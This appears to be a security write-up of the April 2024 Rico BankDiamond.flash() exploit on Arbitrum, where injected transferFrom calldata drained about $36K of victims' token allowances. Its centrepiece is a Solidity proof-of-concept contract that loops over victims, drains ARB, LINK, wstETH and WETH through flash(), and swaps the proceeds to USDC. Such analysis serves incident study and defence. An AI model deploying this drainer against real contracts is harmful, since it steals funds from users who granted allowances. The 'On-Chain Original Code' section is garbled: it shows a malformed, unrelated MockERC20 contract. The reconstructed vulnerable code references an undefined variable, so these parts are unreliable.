# Rico — BankDiamond.flash() Arbitrary transferFrom Execution Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | Rico |
| **Chain** | Arbitrum |
| **Loss** | ~$36,000 |
| **Attacker** | [0xc91cb089](https://arbiscan.io/address/0xc91cb089084f0126458a1938b794aa73b9f9189d) |
| **Attack Contract** | [0x68d843d3](https://arbiscan.io/address/0x68d843d31de072390d41bff30b0076bef0482d8f) |
| **Vulnerable Contract** | [BankDiamond 0x598C6c1c](https://arbiscan.io/address/0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b) |
| **USDC** | [0xaf88d065](https://arbiscan.io/address/0xaf88d065e77c8cC2239327C5EDb3A432268e5831) |
| **ARB** | [0x912CE591](https://arbiscan.io/address/0x912CE59144191C1204E64559FE8253a0e49E6548) |
| **LINK** | [0xf97f4df7](https://arbiscan.io/address/0xf97f4df75117a78c1A5a0DBb814Af92458539FB4) |
| **wstETH** | [0x5979D7b5](https://arbiscan.io/address/0x5979D7b546E38E414F7E9822514be443A4800529) |
| **WETH** | [0x82aF4944](https://arbiscan.io/address/0x82aF49447D8a07e3bd95BD0d56f35241523fBab1) |
| **Root Cause** | The `BankDiamond.flash()` function forwards `transferFrom`-encoded callback data to the token contract without validation, allowing the attacker to unauthorized transfer token balances from specific token holders |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/Rico_exp.sol) |

---

## 1. Vulnerability Overview

Rico's `BankDiamond.flash()` function, beyond providing flash loans, is structured to execute arbitrary token calls contained within callback data. The attacker embedded `transferFrom(victim, attacker, amount)` encoded data in the `flash()` call, exploiting the allowances held by BankDiamond to drain ARB, LINK, wstETH, and WETH, then swapped them for USDC.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: flash() executes arbitrary token calls
contract BankDiamond {
    function flash(
        address token,
        uint256 amount,
        address callbackTarget,
        bytes calldata data  // ← token.call(data) executed without validation
    ) external {
        // Flash loan token transfer
        IERC20(token).transfer(callbackTarget, amount);

        // Callback execution
        // If data is transferFrom encoding, arbitrary transfer occurs
        (bool ok,) = token.call(data);
        require(ok);

        // Repayment check
        require(IERC20(token).balanceOf(address(this)) >= balanceBefore);
    }
}

// ✅ Safe code: flash() handles only lending/repayment, arbitrary calls prohibited
function flash(address token, uint256 amount, address recipient, bytes calldata userData) external {
    uint256 balBefore = IERC20(token).balanceOf(address(this));
    IERC20(token).transfer(recipient, amount);

    // User callback (called only on the recipient contract, unrelated to the token address)
    IFlashBorrower(recipient).onFlashLoan(token, amount, userData);

    // Repayment validation
    require(IERC20(token).balanceOf(address(this)) >= balBefore, "not repaid");
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: BankDiamond.sol
contract MockERC20 {
contract MockERC20 is ERC20 {
    constructor(
        string memory _name,
        string memory _symbol
    ) ERC20(_name, _symbol) {}  // ❌ Vulnerability

    function mint(address _account, uint256 _amount) public returns (bool) {
        _mint(_account, _amount);

        return true;
    }

    function burnFrom(address _account, uint256 _amount) public returns (bool) {
        _burn(_account, _amount);

        return true;
    }
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] BankDiamond.flash(ARB, 0, attacker, transferFromData)
  │         └─ data = abi.encode(transferFrom, victim, attacker, victimBal)
  │         └─ ARB.call(data) → transferFrom executed
  │         └─ victim's ARB → transferred to attacker
  │
  ├─→ [2] Same pattern to drain LINK, wstETH, WETH
  │
  ├─→ [3] Drained tokens → swapped for USDC (Uniswap V3)
  │
  └─→ [4] ~$36K stolen
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IBankDiamond {
    function flash(address token, uint256 amount, address callbackTarget, bytes calldata data) external;
}

interface IUniV3Router {
    struct ExactInputSingleParams {
        address tokenIn; address tokenOut; uint24 fee;
        address recipient; uint256 deadline;
        uint256 amountIn; uint256 amountOutMinimum; uint160 sqrtPriceLimitX96;
    }
    function exactInputSingle(ExactInputSingleParams calldata params) external returns (uint256);
}

contract AttackContract {
    IBankDiamond constant bank   = IBankDiamond(0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b);
    IUniV3Router constant router = IUniV3Router(/* Uniswap V3 Router */);

    address[] tokens = [
        0x912CE59144191C1204E64559FE8253a0e49E6548, // ARB
        0xf97f4df75117a78c1A5a0DBb814Af92458539FB4, // LINK
        0x5979D7b546E38E414F7E9822514be443A4800529, // wstETH
        0x82aF49447D8a07e3bd95BD0d56f35241523fBab1  // WETH
    ];

    function testExploit(address[] calldata victims) external {
        for (uint t = 0; t < tokens.length; t++) {
            IERC20 token = IERC20(tokens[t]);
            for (uint v = 0; v < victims.length; v++) {
                uint256 allowed = token.allowance(victims[v], address(bank));
                uint256 bal     = token.balanceOf(victims[v]);
                uint256 amount  = allowed < bal ? allowed : bal;
                if (amount == 0) continue;

                // [1] Inject transferFrom data into flash()
                bytes memory data = abi.encodeWithSelector(
                    IERC20.transferFrom.selector,
                    victims[v],    // from: victim
                    address(this), // to: attacker
                    amount
                );
                bank.flash(address(token), 0, address(this), data);
            }

            // [2] Swap drained tokens → USDC
            uint256 tokenBal = token.balanceOf(address(this));
            if (tokenBal > 0) {
                token.approve(address(router), tokenBal);
                router.exactInputSingle(IUniV3Router.ExactInputSingleParams({
                    tokenIn: address(token),
                    tokenOut: 0xaf88d065e77c8cC2239327C5EDb3A432268e5831,
                    fee: 3000, recipient: address(this),
                    deadline: block.timestamp, amountIn: tokenBal,
                    amountOutMinimum: 0, sqrtPriceLimitX96: 0
                }));
            }
        }
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Arbitrary External Call (Flash Loan Callback Data Injection) |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (flash() data parameter forgery) |
| **DApp Category** | Lending/Flash Loan Protocol (Diamond Pattern) |
| **Impact** | Multiple victim allowance token drainage (~$36K) |

## 6. Remediation Recommendations

1. **Remove arbitrary calls from flash()**: `flash()` should handle only lending and repayment; direct calls to the token contract must be prohibited
2. **Separate callback recipient**: Callback should only go to the recipient contract; passing `data` to the token contract must be prohibited
3. **Prevent allowance drainage**: Design BankDiamond so it never executes `transferFrom`
4. **Diamond facet audit**: Independently audit the external call permissions of each facet

## 7. Lessons Learned

- If a flash loan function can forward arbitrary `calldata` to a token contract, the same allowance-draining attack as Seneca and Chainge Finance becomes possible.
- Diamond pattern (EIP-2535) protocols may have unclear permission boundaries between facets; the external call capabilities of each facet must be audited separately.
- Allowances that victims grant to trusted protocols are not safe as long as those protocols can execute arbitrary calls.